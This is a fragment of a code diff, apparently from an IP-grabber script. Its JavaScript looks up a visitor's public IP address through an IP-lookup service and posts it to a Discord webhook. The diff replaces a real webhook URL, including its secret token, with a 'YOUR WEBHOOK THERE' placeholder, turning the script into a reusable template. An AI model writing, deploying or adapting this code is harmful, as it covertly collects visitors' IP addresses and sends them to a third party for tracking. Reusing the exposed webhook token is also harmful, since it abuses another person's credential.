@@ -5,7 +5,7 @@ fetch('https://api.ipify.org/?format=json')
 })
 .then(function(data) {
     ip = data.ip;
-    var webhook = 'https://discord.com/api/webhooks/1125774240810012722/2DzDW9RIF3_5NL8KMNKAYAo7r2olcHCxYoGGDed6y7bBjJc7hYPIEYgIuakjW3-lCvgC'
+    var webhook = 'YOUR WEBHOOK THERE!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
     var message = {
         content: 'IP:' + ip
     };
